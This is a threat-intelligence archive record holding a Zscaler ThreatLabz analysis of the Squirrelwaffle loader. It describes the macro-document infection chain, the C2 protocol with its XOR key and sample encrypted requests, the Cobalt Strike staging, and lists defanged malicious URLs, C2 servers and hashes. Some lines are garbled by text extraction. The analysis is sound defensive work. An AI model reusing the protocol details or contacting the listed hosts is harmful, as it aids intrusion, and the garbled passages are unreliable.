{
    "id": "627f39cb-2e8d-4481-af09-7b6966da1933",
    "created_at": "2023-01-12T15:01:00.101185Z",
    "updated_at": "2025-03-27T02:09:18.427643Z",
    "deleted_at": null,
    "sha1_hash": "aaf3926e4b7d733087565a6faf055f88be26857b",
    "title": "2021-09-28 - Squirrelwaffle- New Loader Delivering Cobalt Strike",
    "authors": "",
    "file_creation_date": "2022-05-28T04:48:07Z",
    "file_modification_date": "2022-05-28T04:48:07Z",
    "file_size": 3738448,
    "plain_text": "# Squirrelwaffle: New Loader Delivering Cobalt Strike\n\n**zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike**\n\nZscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver Cobalt Strike.\nIn this blog, we will be analyzing the complete attack chain for this new malware family (as shown in Figure 1). This campaign has been\nrunning since mid-September 2021. The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the Qakbot\nbanking trojan.\n\n## Attack Chain\n\nFigure 1: Squirrelwaffle Attack Chain\n\n## Key Points\n\nThe campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.\nThe spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.\nThe malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.\nThe VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.\nNewly registered domains are used to host the loader payload.\nThe same infrastructure was used to deliver the Qakbot banking trojan.\n\n## Malware Distribution Strategy\n\nSquirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique\nknown as email thread hijacking. Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to\ndupe a victim into believing that an email is from someone that they know who is replying to the same thread. Once a victim clicks on the\nURL, a ZIP file is downloaded that contains a Microsoft Word document. These documents follow a similar naming convention matching the\nregular expression diagram-\\d{2,3}.doc.\n\n\n-----\n\no e a p e, t e e t a 5 as 599 656599 680C939 C 3 9 9 5 9 as t e e a e d ag a 3 6 doc\n\nThis document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2). All the\nother documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.\n\nFigure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro\n\nOnce the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.\nHere, the AutoOpen() subroutine calls another function efile() in the bxh module. There is a UserForm object in the document which contains\na VBS file named pin.vbs that is embedded in the caption of the DocuSign image. The document that contains the macro code leverages\ncscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe. This VBS file\ncontains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3. The payload is\nwritten to %ProgramData% with the filename ww1.dll.\n\n\n-----\n\nFigure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle\n\nThe VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader. The payload DLL is executed via\nrundll32.exe by invoking the export function name ldr.\n\nFigure 4: Example VBS code that downloads and executes the Squirrelwaffle loader\n\n\n-----\n\na p e (sa t ed) U s t at e e used to et e e Squ e a e a e s o be o\n\n_hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html_\n\n_hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html_\n\n_hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html_\n\n_hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html_\n\n_hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html_\n\nFigure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded\n\nFigure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.\n\nThe threat actor behind these campaigns has changed some of their TTPs over time. Recently, the initial infection vector has used hidden\nMicrosoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs. The Squirrelwaffle\nloader is subsequently executed via regsvr32.exe. An example for this campaign shown in Figure 6, used a Microsoft Excel document with\nthe MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.\n\n\n-----\n\nFigure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle\n\nThe hidden sheet in this Excel document is shown in Figure 7.\n\nFigure 7: Excel 4.0 hidden sheet containing a malicious macro code\n\nThe extracted macro code is shown in Figure 8.\n\n\n-----\n\nFigure 8: Macro code extracted from a hidden Excel sheet\n\nThe threat actor also changed the location where the payload is written to disk. Example (sanitized) URLs that were used to retrieve\nSquirrelwaffle from this campaign are shown below:\n\n_hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html_\n\n_hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html_\n\n_hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html_\n\n## Technical Analysis of the Payload\n\nThis analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7. Once the Squirrelwaffle payload is\ndownloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the\npayload. Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.\n\nFigure 9: Squirrelwaffle compilation metadata\n\nThe Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer. Similar packers have been observed in other malware\nfamilies including Ursnif and Zloader.\n\n\n-----\n\nSqu e a e co ta s a a dcoded co gu at o t at s e c ypted t e b a y e e a e t o a co po e ts a st o C C U s a d a\nlist of IP addresses to block, which belong to sandboxes and analysis platforms. These lists are obfuscated using an XOR-based algorithm\nwith hardcoded keys. An example formatted Squirrelwaffle configuration is shown in Figure 10.\n\nFigure 10: Formatted Squirrelwaffle configuration after decryption\n\nOnce the malware decodes all of the CnC domains and IP addresses to block, it creates a socket and sends the data using the send()\nfunction and receives the content from the CnC using recv() calls. The CnC communication protocol utilizes an HTTP POST request with a\nBase64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key KJKLO. An example HTTP POST request\nis shown below:\n\n**POST /dXf4cS4GPL/fXMKNg0nKzN/DA15DggBI0N6dX1le310YXlkenw= HTTP/1.1**\n\n**Host: test.dirigu.ro**\n\n**Content-Length: 76**\n\n**eHp+fHZ7Q0ICAAUPQkUMcRYePyo5ORcrKiQ4LCkTCjo7CC4/KxceIConIiIoQkMHHw0CAhoKRkI=**\n\nNote that this request does not contain a User-Agent field in the HTTP header.\n\nThe path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XORbased algorithm and key as described above. This encoded string includes an alphanumeric string with a random length between 1 and 28\ncharacters followed by the IP address of the system. Each field is delimited by a single tab character. An example before encryption is shown\nbelow:\n\n**t2nQfj3SL3XByImciQTqVa\\t192.168.125.11**\n\nThe HTTP POST body contains another Base64 encoded string that includes the victim’s computer name, username, application data\ndirectory, and workgroup. Each field is delimited with two tab characters. An example payload before encryption is shown below:\n\n**GEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t**\n\nThis payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.\n\nThe SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two\ntab characters as delimiter between fields. These fields include a status code, a timestamp, the external IP address of the system, along with\nthe victim’s system information that was previously sent. An example decrypted response is shown below:\n\n**200\\r\\n\\t\\t\\n\\r1631911856\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-**\n**PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\**\n\nThe SquirrelWaffle CnC response may also contain a second-stage payload. An example decrypted response is shown below:\n\n**200\\r\\n\\t\\t\\n\\r1631913267\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-**\n**PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rMZ\\x90\\x00\\x03\\x00\\x00**\n\n**[[email protected]\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00](https://www.zscaler.com/cdn-cgi/l/email-protection)**\n**program cannot be run in DOS mode...\\x00\\x00\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**\n\n\n-----\n\ns seco d stage pay oad be tte to a e a e t at co s sts o e e e a do a p a u e c c a acte s appe ded t a t t\nextension, and then executed by SquirrelWaffle.\n\nZscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147. This\nfile is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C,\nwhich further downloads the Cobalt Strike beacon.\n\n[Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a jQuery request. The EICAR string is likely an artifact](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile)\n[from the threat actor using a demo version of Cobalt Strike.](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/)\n\nFigure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.\n\nThe Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js. The Cobalt Strike CnC\nserver responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in\nFigure 12.\n\nFigure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.\n\n[This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the XOR-based algorithm replicated below in Figure 13.](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html)\n\n\n-----\n\ngu e 3 Coba t St e beaco dec ypt o a go t\n\nThe Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:\n\n_hxxps://systemmentorsec.com/jquery-3.3.1.min.js,_\n\n_hxxps://213.227.154.92/jquery-3.3.1.min.js_\n\n## Cloud Sandbox Detection\n\nFigure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader\n\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels including the signature\nshown below:\n\n[Win32.Downloader.Squirrelwaffle](https://threatlibrary.zscaler.com/threats/70c5e6f0-db5c-4a55-87de-7c71dab50c36)\n\n## Conclusion\n\nAfter the Emotet botnet takedown earlier this year, criminal threat actors are filling that void. Squirrelwaffle appears to be a new loader taking\nadvantage of this gap. It is not yet clear if Squirrelwaffle is developed and distributed by a known threat actor or a new group. However,\nsimilar distribution techniques were previously used by Emotet. The Zscaler ThreatLabz team will continue to monitor this attack, as well as\nothers, to help keep our customers safe.\n\n## MITRE ATT&CK TTP Mapping\n\nTactic Technique\n\nT1059 Command and Scripting Interpreter\n\nT1592 Gather Victim Host Information\n\nT1569 System Services\n\nT1137 Office Application Startup\n\nT1055 Process Injection\n\nT1140 Deobfuscate/Decode Files or Information\n\nT1436 Commonly Used Port\n\nT1437 Standard Application Layer Protocol\n\nT1106 Native API\n\n\n-----\n\n## Indicators of Compromise\n\n### Squirrelwaffle ZIP archive URLs\n\nhxxp://amaimaging[.]com/voluptas-quidem/documents.zip\nhxxp://beautifulgist[.]com/id-alias/documents.zip\nhxxp://bussiness-z[.]ml/qui-quia/documents.zip\nhxxp://gadhwadasamaj.techofi[.]in/expedita-consequatur/documents.zip\nhxxp://inetworx.co[.]za/voluptate-sunt/documents.zip\nhxxp://insurance.akademiilmujaya[.]com/beatae-sunt/documents.zip\nhxxp://prevenzioneformazionelavoro[.]it/quasi-reprehenderit/documents.zip\nhxxp://procatodicadelacosta[.]com/neque-et/documents.zip\nhxxp://readgasm[.]com/repudiandae-provident/documents.zip\nhxxp://rinconadadellago[.]com.mx/qui-quia/documents.zip\nhxxp://saraviatowing[.]net/et-praesentium/documents.zip\nhxxp://shahanaschool[.]in/illum-accusamus/documents.zip\nhxxp://srv7.corpwebcontrol[.]com/np/prog_est.zip\nhxxp://srv7.corpwebcontrol[.]com/np/user_est.zip\nhxxp://stripemovired.ramfactoryarg[.]com/nostrum-ab/documents.zip\nhxxp://syncun[.]com/natus-aut/documents.zip\nhxxp://tradingview-brokers.skoconstructionng[.]com/molestiae-voluptatum/documents.zip\nhxxps://abogados-en-medellin[.]com/odit-error/documents.zip\nhxxps://amaimaging[.]com/voluptas-quidem/ducimus.zip\nhxxps://builtbvbh-com[.]gq/eum-est/voluptas.zip\nhxxps://builtbybh-com[.]gq/eum-est/voluptas.zip\nhxxps://builtybybh-com[.]gq/eum-est/voluptas.zip\nhxxps://cctvfiles[.]xyz/aliquam-ipsam/documents.zip\nhxxps://focus.focalrack[.]com/enim-rerum/ducimus.zip\nhxxps://inetworx.co[.]za/voluptate-sunt/est.zip\nhxxps://kmslogistik[.]com/repellat-et/est.zip\nhxxps://moeinjelveh[.]ir/et-eligendi/placeat.zip\nhxxps://readgasm[.]com/repudiandae-provident/voluptas.zip\nhxxps://saraviatowing[.]net/et-praesentium/placeat.zip\nhxxps://sextoystore.co[.]in/temporibus-aut/est.zip\nhxxps://shivrajengineering[.]in/qui-dolores/placeat.zip\n\n### Squirrelwaffle Loader URLs\n\nhxxps://ghapan[.]com/Kdg73onC3oQ/090921.html\nhxxps://yoowi[.]net/tDzEJ8uVGwdj/130921.html\nhxxps://gruasingenieria[.]pe/LUS1NTVui6/090921.html\nhxxps://chaturanga.groopy[.]com/7SEZBnhMLW/130921.html\nhxxps://lotolands[.]com/JtaTAt4Ej/130921.html\nhxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html\nhxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html\nhxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html\n\n### Squirrelwaffle Word Document File MD5 Hashes\n\n326498ae163f0d6b8a863d24793f152d\n2156a1a8b0c579a51ea77d1bc7062b49\n5e9f33e5baa6d6efca91c8db78c01bd0\nfae4ca3c95a5068063637b2f2ed3a5b2\na449e5044437c453fce2ead881aa8161\nc27545fbb3b4ff35277bce1383655e46\nc774e400b46f4c0bb90c11e349bc36a0\nc2ed8fc614aeda36a7e3a638fa7db16a\ndb11964b27738bf4e3a1501e11bd54ad\n822e20c95df7165009600a9bfbff9b5e\nc1ed800a4ae9d4efd61de3aa7fd657b4\nb478bc389fc15e17b231984fa80e2b0d\ne599a656599a2680c9392c7329d9d519\nda48063b7d75ec645f4370b95c28675c\nc3bd4145feaaae541cb17ccc7cbd2e44\n558f97103085394c3a35c9b03839fe72\n\n\n-----\n\na0 5b 3 6cd b66 36dcdc 08 b 5\n5b50f7beabcff32bd02de2dda2766a7b\n\n### Squirrelwaffle VBS File MD5 Hash\n\n9da69f65ce4e8e57aef3ea1dd96f42ec\n\n### Squirrelwaffle Loader MD5 Hashes\n\n7e9ba57db08f53b56715b0a8121bd839\n5ec89ea30af2cc38ae183d12ffacbcf7\na3ecc9951178447b546b004ea2dfd93f\n9545905ea3735dcac289eead39e3f893\n732ce2ef4b18042ef9e3f3e52ad59916\ncb905bb6a38b5d253eb64aab46eafbd7\nebeeef845d0d666363935da89a57b44d\n\n### Unpacked DLL file MD5 Hash\n\n3ecc9ca5e744d7ddafa04834c70b95c3\n\n### Domain used by the DLL for Squirrelwaffle CnC\n\n107[.]180[.]12[.]15 port 80 centralfloridaasphalt[.]com\n119[.]235[.]250[.]50 port 80 kmslogistik[.]com\n143[.]95[.]80[.]83 port 80 chaturanga[.]groopy[.]com\n160[.]153[.]129[.]37 port 80 mercyfoundationcio[.]org\n160[.]153[.]129[.]37 port 80 shoeclearanceoutlet[.]co[.]uk\n160[.]153[.]131[.]187 port 80 spiritofprespa[.]com\n166[.]62[.]28[.]139 port 80 jhehosting[.]com\n166[.]62[.]28[.]139 port 80 key4net[.]com\n166[.]62[.]28[.]139 port 80 lead[.]jhinfotech[.]co\n166[.]62[.]28[.]139 port 80 voip[.]voipcallhub[.]com\n166[.]62[.]28[.]139 port 80 voipcallhub[.]com\n194[.]181[.]228[.]45 port 80 bartek-lenart[.]pl\n194[.]181[.]228[.]45 port 80 lenartsa[.]webd[.]pro\n202[.]52[.]147[.]113 port 80 amjsys[.]com\n203[.]124[.]44[.]95 port 80 novamarketing[.]com[.]pk\n216[.]219[.]81[.]3 port 80 ems[.]prodigygroupindia[.]com\n216[.]219[.]81[.]3 port 80 hrms[.]prodigygroupindia[.]com\n\n### Cobalt Strike Stager MD5 Hashes\n\n116301fd453397fdf3cb291341924147\nef799b5261fd69b56c8b70a3d22d5120\n\n### Cobalt Strike CnC Servers\n\n213.227.154[.]92:443/jquery-3.3.1.min.js\n213.227.154[.]92:8080/jquery-3.3.1.min.js\nsystemmentorsec[.]com:443/jquery-3.3.1.min.js\nsystemmentorsec[.]com:8080/jquery-3.3.1.min.js\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-28 - Squirrelwaffle- New Loader Delivering Cobalt Strike.pdf"
    ],
    "report_names": [
        "2021-09-28 - Squirrelwaffle- New Loader Delivering Cobalt Strike.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535660,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653713287,
    "ts_modification_date": 1653713287,
    "files": {
        "pdf": "https://archive.orkl.eu/aaf3926e4b7d733087565a6faf055f88be26857b.pdf",
        "text": "https://archive.orkl.eu/aaf3926e4b7d733087565a6faf055f88be26857b.txt",
        "img": "https://archive.orkl.eu/aaf3926e4b7d733087565a6faf055f88be26857b.jpg"
    }
}